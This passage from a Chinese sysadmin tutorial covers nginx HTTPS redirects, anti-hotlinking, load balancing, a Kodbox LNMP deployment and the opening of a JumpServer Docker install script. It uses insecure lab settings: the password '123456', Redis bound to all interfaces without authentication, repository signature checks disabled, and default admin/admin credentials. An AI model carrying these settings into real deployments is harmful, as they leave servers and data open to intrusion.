--with-http_ssl_module<br>make<br>make install<br></code></pre></td></tr></table></figure><h3 id="（2）配置文件"><a href="#（2）配置文件" class="headerlink" title="（2）配置文件"></a>（2）配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Rocky04 ~]<span class="hljs-comment"># vim /apps/nginx/conf.d/pc.conf</span><br>server &#123;<br>    listen 80;<br>    root /data/nginx/html/pc;<br>    server_name www.willoneday.org;<br>    location / &#123;<br>        rewrite ^(.*)$ https://<span class="hljs-variable">$host</span>/<span class="hljs-variable">$1</span> redirect;<br>    &#125;<br>&#125;<br>server &#123;<br>    listen 443 ssl;<br>    ssl certificate /apps/nginx/ssl/www.willoneday.org.crt;<br>    ssl certificate_key /apps/nginx/ssl/www.willoneday.org.key;<br>    ssl_session_cache shared:sscache:20m;<br>    ssl_session_timeout 10m;<br>    server name www.willoneday.org<br>    root /data/nginx/html/pc;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><hr><h2 id="二、nginx实现动静分离"><a href="#二、nginx实现动静分离" class="headerlink" title="二、nginx实现动静分离"></a>二、nginx实现动静分离</h2><h3 id="（1）范例一"><a href="#（1）范例一" class="headerlink" title="（1）范例一"></a>（1）范例一</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">location ^~ /images &#123;<br>    root /data/nginx/;<br>    index index.html;<br>&#125;<br><br>location /api &#123;<br>    <span class="hljs-built_in">alias</span> /data/nginx/api;<br>    index index.html;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="（2）范例二"><a href="#（2）范例二" class="headerlink" title="（2）范例二"></a>（2）范例二</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">location ~ \.php$ &#123;<br>    root /scripts;<br>    fastcgi_pass 127.0.0.1:9000;<br>    fastcgi_index index.php;<br>    fastcgi_param SCRIPT_FILENAME $document_root<span class="hljs-variable">$fastcgi_script_name</span>; <span class="hljs-comment">#默认脚本路径</span><br>    <span class="hljs-comment">#fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;      #此行写法不再需要上面的 root 指令</span><br>    include fastcgi_params;                                           <span class="hljs-comment">#此文件默认系统已提供,存放的相对路径为prefix/conf</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><hr><h2 id="三、nginx实现防盗链功能"><a href="#三、nginx实现防盗链功能" class="headerlink" title="三、nginx实现防盗链功能"></a>三、nginx实现防盗链功能</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#语法格式：</span><br>location /images &#123;<br>    root /data/nginx/html/pc;<br>    index index.html;<br>    valid_referers none blocked server_names<br>    *.example.com example.* www.example.org/galleries/ ~\.google\.;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$invalid_referer</span>) &#123;<br>        <span class="hljs-built_in">return</span> 403;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#范例</span><br>[root@centos8 ~]<span class="hljs-comment"># vim /apps/nginx/conf/conf.d/pc.conf</span><br>server &#123;<br>    index index.html;<br>    valid_referers none blocked server_names *.magedu.com *.magedu.org ~\.google\. ~\.baidu\. ~\.bing\. ~\.so\. ; <span class="hljs-comment">#定义有效的referer</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$invalid_referer</span>) &#123;            <span class="hljs-comment">#假如是使用其他的无效的referer访问</span><br>        <span class="hljs-built_in">return</span> 403 <span class="hljs-string">&quot;Forbidden Access&quot;</span>; <span class="hljs-comment">#返回状态码403</span><br>    &#125;<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><hr><h2 id="四、解析nginx常见的负载均衡算法"><a href="#四、解析nginx常见的负载均衡算法" class="headerlink" title="四、解析nginx常见的负载均衡算法"></a>四、解析nginx常见的负载均衡算法</h2><h3 id="（1）http-反向代理负载均衡"><a href="#（1）http-反向代理负载均衡" class="headerlink" title="（1）http 反向代理负载均衡"></a><strong>（1）http 反向代理负载均衡</strong></h3><blockquote><p>Nginx 可以基于ngx_http_upstream_module模块<strong>提供服务器分组转发、权重分配、状态监测、调度算法等高级功能</strong></p><p><strong><a href="https://nginx.org/en/docs/http/ngx_http_upstream_module.html">官方文档</a></strong></p></blockquote><h3 id="（2）-http-upstream配置参数"><a href="#（2）-http-upstream配置参数" class="headerlink" title="（2） http upstream配置参数"></a>（2） http upstream配置参数</h3><blockquote><ul><li><strong>server address [parameters];</strong></li></ul><p>  #配置一个后端web服务器，配置在upstream内，至少要有一个server服务器配置。</p><ul><li><p><strong>#server支持的parameters如下：</strong></p></li><li><ul><li><strong>weight=number</strong><br><strong>#设置权重，默认为1,实现类似于LVS中的WRR,WLC等</strong></li></ul></li><li><ul><li><strong>max_conns=number</strong><br>#给当前后端server设置最大活动链接数，默认为0表示没有限制</li><li><strong>max_fails=number</strong><br><strong>#后端服务器的下线条件,当客户端访问时,对本次调度选中的后端服务器连续进行检测多少次,</strong><br><strong>#如果都失败就标记为不可用,默认为1次,</strong><br><strong>#当客户端访问时,才会利用TCP触发对探测后端服务器健康性检查,而非周期性的探测</strong></li></ul></li><li><ul><li><strong>fail_timeout=time</strong></li></ul></li></ul><p>      #后端服务器的上线条件,对已经检测到处于不可用的后端服务器,每隔此时间间隔再次进行检测是否恢复可用，如果发现可用,则将后端服务器参与调度,默认为10秒</p><ul><li><ul><li><strong>backup</strong></li></ul></li></ul><p>      <strong>#设置为备份服务器，当所有后端服务器不可用时,才会启用此备用服务器</strong></p><ul><li><ul><li><strong>down</strong></li></ul></li></ul><p>      <strong>#标记为down状态,可以平滑下线后端服务器,新用户不再调度到此主机,旧用户不受影响</strong></p></blockquote><blockquote><p><strong>调度算法：三种大的类</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">hash</span> KEY [consistent];<br><span class="hljs-comment">#基于指定请求报文中首部字段或者URI等key做hash计算，使用consistent参数，将使用ketama一致性hash算法，</span><br><span class="hljs-comment">#适用于后端是Cache服务器（如varnish）时使用，consistent定义使用一致性hash运算，一致性hash基于取模运算</span><br><br><span class="hljs-comment">#示例</span><br><span class="hljs-built_in">hash</span> <span class="hljs-variable">$request_uri</span> consistent; <span class="hljs-comment">#基于用户请求的uri做hash</span><br><span class="hljs-built_in">hash</span> <span class="hljs-variable">$cookie_sessionid</span>        <span class="hljs-comment">#基于cookie中的sessionid这个key进行hash调度,实现会话绑定</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip_hash;<br><span class="hljs-comment">#源地址hash调度方法，基于的客户端的remote_addr(源地址IPv4的前24位或整个IPv6地址)做hash计算，以实现会话保持</span><br><span class="hljs-comment">#hash $remote_addr 则是对全部32bit的IPv4进行hash计算</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">least_conn;<br><span class="hljs-comment">#最少连接调度算法，优先将客户端请求调度到当前连接最少的后端服务器,相当于LVS中的WLC</span><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#自定义一组服务器，配置在http块内</span><br>upstream name &#123;<br>    server .....<br>    ......<br>&#125;<br><br><span class="hljs-comment">#示例</span><br>[root@Rocky04 ~]<span class="hljs-comment"># vim /apps/nginx/conf/conf.d/pc.conf</span><br>upstream webserver &#123;<br>    <span class="hljs-comment">#hash $request_uri consistent;</span><br>    <span class="hljs-comment">#hash $cookie_sessionid</span><br>    <span class="hljs-comment">#ip_hash;</span><br>    <span class="hljs-comment">#least_conn;</span><br>    server 10.0.0.18 weight=3;<br>    server 10.0.0.28;<br>    server 10.0.0.38 down;<br>&#125;<br>server &#123;<br>    listen 80;<br>    root /data/nginx/html/pc;<br>    server_name www.willoneday.org;<br>    location / &#123;<br>        proxy_pass http://webserver;    <span class="hljs-comment">#upstream定义的名字</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><hr><h2 id="五、基于LNMP完成搭建任意一种应用"><a href="#五、基于LNMP完成搭建任意一种应用" class="headerlink" title="五、基于LNMP完成搭建任意一种应用"></a>五、基于LNMP完成搭建任意一种应用</h2><h3 id="LNMP实现可道云私有云"><a href="#LNMP实现可道云私有云" class="headerlink" title="LNMP实现可道云私有云"></a>LNMP实现可道云私有云</h3><blockquote><p><strong><a href="http://kodcloud.com/">可道云官网</a></strong></p><p><strong><a href="http://pecl.php.net/package/redis">php-redis扩展模块官网</a></strong></p><p><strong>部署规划：</strong></p><ul><li>10.0.0.20：Rocky02，Nginx，php-fpm，kodbox</li><li>10.0.0.30：Rocky03，MySQL8.0，Redis5.0</li></ul></blockquote><h4 id="（1）准备-MySQL-数据库"><a href="#（1）准备-MySQL-数据库" class="headerlink" title="（1）准备 MySQL 数据库"></a>（1）准备 MySQL 数据库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Rocky03 ~]<span class="hljs-comment"># yum -y install mysql-server</span><br>[root@Rocky03 ~]<span class="hljs-comment"># systemctl enable --now mysqld</span><br>[root@Rocky03 ~]<span class="hljs-comment"># mysql</span><br>mysql&gt; create user <span class="hljs-string">&#x27;kodbox&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;<br>mysql&gt; create database kodbox;<br>mysql&gt; grant all on kodbox.* to <span class="hljs-string">&#x27;kodbox&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="（2）准备-Redis-服务"><a href="#（2）准备-Redis-服务" class="headerlink" title="（2）准备 Redis 服务"></a>（2）准备 Redis 服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Rocky03 ~]<span class="hljs-comment"># yum install -y redis</span><br>[root@Rocky03 ~]<span class="hljs-comment"># vim /etc/redis.conf</span><br><span class="hljs-built_in">bind</span> 0.0.0.0 <span class="hljs-comment">#修改此行</span><br>[root@Rocky03 ~]<span class="hljs-comment"># systemctl enable --now redis</span><br></code></pre></td></tr></table></figure><h4 id="（3）准备-Nginx-服务"><a href="#（3）准备-Nginx-服务" class="headerlink" title="（3）准备 Nginx 服务"></a>（3）准备 Nginx 服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Rocky02 ~]<span class="hljs-comment"># yum -y install nginx</span><br>[root@Rocky02 ~]<span class="hljs-comment"># mkdir -pv /data/html</span><br>[root@Rocky02 ~]<span class="hljs-comment"># vim /etc/nginx/conf.d/kod.conf</span><br>server &#123;<br>    listen 80;<br>    server_name kod.willoneday.org;<br>    root /data/html;<br>    location / &#123;<br>        index index.php index.html;<br>    &#125;<br>    location ~ \.php$ &#123;<br>        root           /data/html;<br>        fastcgi_pass   127.0.0.1:9000;<br>        fastcgi_index  index.php;<br>        fastcgi_param  SCRIPT_FILENAME  $document_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>        include        fastcgi_params;<br>    &#125;<br>&#125;<br><br>[root@Rocky02 ~]<span class="hljs-comment"># systemctl enable --now nginx</span><br></code></pre></td></tr></table></figure><h4 id="（4）安装和配置-php-支持-redis"><a href="#（4）安装和配置-php-支持-redis" class="headerlink" title="（4）安装和配置 php 支持 redis"></a>（4）安装和配置 php 支持 redis</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装php相关包</span><br>[root@Rocky02 ~]<span class="hljs-comment"># yum install -y php-fpm wget php-json php-mbstring php-xml php-gd php-mysqlnd</span><br><br><span class="hljs-comment">#修改fpm配置文件</span><br>[root@Rocky02 ~]<span class="hljs-comment"># vim /etc/php-fpm.d/www.conf</span><br>user = nginx<br>group = nginx<br>;listen = /run/php-fpm/www.sock <span class="hljs-comment">#注释此行改成下面</span><br>listen = 127.0.0.1:9000<br><br><span class="hljs-comment">#安装编译相关包</span><br><span class="hljs-comment">#执行下面phpize命令会提示需安装相关php的两个软件包</span><br>[root@Rocky02 ~]<span class="hljs-comment"># yum install -y php-cli php-devel make</span><br><br><span class="hljs-comment">#编译redis模块</span><br>[root@Rocky02 ~]<span class="hljs-comment"># wget http://pecl.php.net/get/redis-5.3.7.tgz</span><br>[root@Rocky02 ~]<span class="hljs-comment"># tar xf redis-5.3.7.tgz</span><br>[root@Rocky02 ~]<span class="hljs-comment"># cd redis-5.3.7/</span><br>[root@Rocky02 redis-5.3.7]<span class="hljs-comment"># cat INSTALL.markdown</span><br>[root@Rocky02 redis-5.3.7]<span class="hljs-comment"># phpize</span><br>[root@Rocky02 redis-5.3.7]<span class="hljs-comment"># ./configure</span><br>[root@Rocky02 redis-5.3.7]<span class="hljs-comment"># make -j 2 &amp;&amp; make install</span><br>...省略...<br>Installing shared extensions:     /usr/lib64/php/modules/<br><br><span class="hljs-comment">#出现上面表示编译成功</span><br>[root@Rocky02 redis-5.3.7]<span class="hljs-comment"># ll /usr/lib64/php/modules/redis.so</span><br>-rwxr-xr-x 1 root root 3530824 Dec 16 17:54 /usr/lib64/php/modules/redis.so<br><br><span class="hljs-comment">#根据其他扩展模块得知需要创建此文件</span><br>[root@Rocky02 ~]<span class="hljs-comment"># vim /etc/php.d/31-redis.ini</span><br>extension=redis<br><br>[root@Rocky02 ~]<span class="hljs-comment"># systemctl enable --now php-fpm</span><br></code></pre></td></tr></table></figure><h4 id="（5）准备可道云程序"><a href="#（5）准备可道云程序" class="headerlink" title="（5）准备可道云程序"></a>（5）准备可道云程序</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@Rocky02 ~]<span class="hljs-comment"># yum install -y unzip</span><br>[root@Rocky02 ~]<span class="hljs-comment"># wget https://static.kodcloud.com/update/download/kodbox.1.36.zip</span><br>[root@Rocky02 ~]<span class="hljs-comment"># unzip kodbox.1.36.zip -d /data/html</span><br>[root@Rocky02 ~]<span class="hljs-comment"># chown -R nginx.nginx /data/html</span><br></code></pre></td></tr></table></figure><h4 id="（6）初始化和登录可道云"><a href="#（6）初始化和登录可道云" class="headerlink" title="（6）初始化和登录可道云"></a>（6）初始化和登录可道云</h4><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221216195946294-1152838826.png"><img src="2927659-20221216195946294-1152838826.png" alt="img"></a></p><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221216200025327-777781800.png"><img src="2927659-20221216200025327-777781800.png" alt="img"></a></p><h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2><hr><h2 id="六、jumpserver-总结安装部署，添加用户授权，行为审计"><a href="#六、jumpserver-总结安装部署，添加用户授权，行为审计" class="headerlink" title="六、jumpserver 总结安装部署，添加用户授权，行为审计"></a>六、jumpserver 总结安装部署，添加用户授权，行为审计</h2><h3 id="1-基于容器部署"><a href="#1-基于容器部署" class="headerlink" title="1 基于容器部署"></a>1 基于容器部署</h3><blockquote><p><strong>基于容器</strong>**,**<strong>安装完毕后可以通过以下方式访问</strong></p><ul><li>浏览器访问：http://&lt;容器所在服务器IP&gt;</li><li>默认管理员账户 admin 密码 admin</li><li>SSH 访问：ssh -p 2222 &lt;容器所在服务器IP&gt;</li><li>XShell 等工具请添加 connection 连接, 默认 ssh 端口 2222</li></ul></blockquote><h4 id="（1）安装-Docker-环境"><a href="#（1）安装-Docker-环境" class="headerlink" title="（1）安装 Docker 环境"></a>（1）安装 Docker 环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>DOCKER_VERSION=<span class="hljs-string">&quot;20.10.10&quot;</span><br>UBUNTU_DOCKER_VERSION=<span class="hljs-string">&quot;5:<span class="hljs-variable">$&#123;DOCKER_VERSION&#125;</span>~3-0~`lsb_release -si`-`lsb_release -cs`&quot;</span><br><span class="hljs-comment">#UBUNTU_DOCKER_VERSION=&quot;5:20.10.9~3-0~`lsb_release -si`-`lsb_release -cs`&quot;</span><br><span class="hljs-comment">#UBUNTU_DOCKER_VERSION=&quot;5:19.03.14~3-0~lsb_release -si-`lsb_release -cs`&quot;</span><br><br>COLOR_SUCCESS=<span class="hljs-string">&quot;echo -e \\033[1;32m&quot;</span><br>COLOR_FAILURE=<span class="hljs-string">&quot;echo -e \\033[1;31m&quot;</span><br>END=<span class="hljs-string">&quot;\033[m&quot;</span><br><br>. /etc/os-release<br><br><span class="hljs-function"><span class="hljs-title">color</span></span> () &#123;<br>    RES_COL=60<br>    MOVE_TO_COL=<span class="hljs-string">&quot;echo -en \\033[<span class="hljs-variable">$&#123;RES_COL&#125;</span>G&quot;</span><br>    SETCOLOR_SUCCESS=<span class="hljs-string">&quot;echo -en \\033[1;32m&quot;</span><br>    SETCOLOR_FAILURE=<span class="hljs-string">&quot;echo -en \\033[1;31m&quot;</span><br>    SETCOLOR_WARNING=<span class="hljs-string">&quot;echo -en \\033[1;33m&quot;</span><br>    SETCOLOR_NORMAL=<span class="hljs-string">&quot;echo -en \E[0m&quot;</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> &amp;&amp; <span class="hljs-variable">$MOVE_TO_COL</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;[&quot;</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$2</span> = <span class="hljs-string">&quot;success&quot;</span> -o <span class="hljs-variable">$2</span> = <span class="hljs-string">&quot;0&quot;</span> ] ;<span class="hljs-keyword">then</span><br>        <span class="hljs-variable">$&#123;SETCOLOR_SUCCESS&#125;</span><br>        <span class="hljs-built_in">echo</span> -n $<span class="hljs-string">&quot;  OK  &quot;</span>    <br>    <span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$2</span> = <span class="hljs-string">&quot;failure&quot;</span> -o <span class="hljs-variable">$2</span> = <span class="hljs-string">&quot;1&quot;</span>  ] ;<span class="hljs-keyword">then</span> <br>        <span class="hljs-variable">$&#123;SETCOLOR_FAILURE&#125;</span><br>        <span class="hljs-built_in">echo</span> -n $<span class="hljs-string">&quot;FAILED&quot;</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-variable">$&#123;SETCOLOR_WARNING&#125;</span><br>        <span class="hljs-built_in">echo</span> -n $<span class="hljs-string">&quot;WARNING&quot;</span><br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-variable">$&#123;SETCOLOR_NORMAL&#125;</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;]&quot;</span><br>    <span class="hljs-built_in">echo</span> <br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">install_docker</span></span>()&#123;<br>    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$ID</span> = <span class="hljs-string">&quot;centos&quot;</span> -o <span class="hljs-variable">$ID</span> = <span class="hljs-string">&quot;rocky&quot;</span> ];<span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$VERSION_ID</span> = <span class="hljs-string">&quot;7&quot;</span> ];<span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">cat</span> &gt;  /etc/yum.repos.d/docker.repo  &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">[docker]</span><br><span class="hljs-string">name=docker</span><br><span class="hljs-string">gpgcheck=0</span><br><span class="hljs-string">#baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/</span><br><span class="hljs-string">baseurl=https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/centos/7/x86_64/stable/</span><br><span class="hljs-string">EOF</span><br>        <span class="hljs-keyword">else</span>     <br>            <span class="hljs-built_in">cat</span> &gt;  /etc/yum.repos.d/docker.repo  &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">[docker]</span><br><span class="hljs-string">name=docker</span><br><span class="hljs-string">gpgcheck=0</span><br><span class="hljs-string">#baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/8/x86_64/stable/</span><br><span class="hljs-string">baseurl=https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/centos/8/x86_64/stable/</span><br><span class="hljs-string">EOF</span><br>        <span class="hljs-keyword">fi</span><br>    yum clean all <br>        <span class="hljs-variable">$&#123;COLOR_FAILURE&#125;</span> <span class="hljs-string">&quot;Docker有以下版本&quot;</span><span class="hljs-variable">$&#123;END&#125;</span><br>        yum list docker-ce --showduplicates<br>        <span class="hljs-variable">$&#123;COLOR_FAILURE&#125;</span><span class="hljs-string">&quot;5秒后即将安装: docker-&quot;</span><span class="hljs-variable">$&#123;DOCKER_VERSION&#125;</span><span class="hljs-string">&quot; 版本.....&quot;</span><span class="hljs-variable">$&#123;END&#125;</span><br>        <span class="hljs-variable">$&#123;COLOR_FAILURE&#125;</span><span class="hljs-string">&quot;如果想安装其它Docker版本，请按ctrl+c键退出，修改版本再执行&quot;</span><span class="hljs-variable">$&#123;END&#125;</span><br>        <span class="hljs-built_in">sleep</span> 5<br>        yum -y install docker-ce-<span class="hljs-variable">$DOCKER_VERSION</span> docker-ce-cli-<span class="hljs-variable">$DOCKER_VERSION</span>  \<br>            || &#123; color <span class="hljs-string">&quot;Base,Extras的yum源失败,请检查yum源配置&quot;</span> 1;<span class="hljs-built_in">exit</span>; &#125;<br>    <span class="hljs-keyword">else</span><br>    dpkg -s docker-ce &amp;&gt; /dev/null &amp;&amp; <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;Docker已安装，退出&quot;</span> 1 &amp;&amp; <span class="hljs-built_in">exit</span><br>        apt update || &#123; color <span class="hljs-string">&quot;更新包索引失败&quot;</span> 1 ; <span class="hljs-built_in">exit</span> 1; &#125;  <br>        apt  -y install apt-transport-https ca-certificates curl software-properties-common || \<br>            &#123; color <span class="hljs-string">&quot;安装相关包失败&quot;</span> 1 ; <span class="hljs-built_in">exit</span> 2;  &#125;  <br>        curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -<br>        add-apt-repository <span class="hljs-string">&quot;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span><br>        apt update<br>        <span class="hljs-variable">$&#123;COLOR_FAILURE&#125;</span> <span class="hljs-string">&quot;Docker有以下版本&quot;</span><span class="hljs-variable">$&#123;END&#125;</span><br>        apt-cache madison docker-ce<br>        <span class="hljs-variable">$&#123;COLOR_FAILURE&#125;</span><span class="hljs-string">&quot;5秒后即将安装: docker-&quot;</span><span class="hljs-variable">$&#123;UBUNTU_DOCKER_VERSION&#125;</span><span class="hljs-string">&quot; 版本.....&quot;</span><span class="hljs-variable">$&#123;END&#125;</span><br>        <span class="hljs-variable">$&#123;COLOR_FAILURE&#125;</span><span class="hljs-string">&quot;如果想安装其它Docker版本，请按ctrl+c键退出，修改版本再执行&quot;</span><span class="hljs-variable">$&#123;END&#125;</span><br>        <span 